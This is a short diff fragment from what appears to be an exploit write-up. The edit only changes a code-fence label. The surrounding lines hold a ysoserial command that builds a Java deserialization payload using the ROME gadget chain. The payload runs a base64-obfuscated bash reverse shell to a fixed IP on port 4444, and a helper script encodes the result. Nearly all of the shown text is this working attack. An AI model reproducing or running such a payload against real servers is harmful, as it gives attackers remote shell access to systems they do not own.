@@ -215,7 +215,7 @@ print(ba)
 file.close()
 ```
 
-```cmd
+```bash
 java -jar ysoserial.jar ROME "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44OC4xNS4xNDkvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" > a.bin
 python file_b64.py
 ```
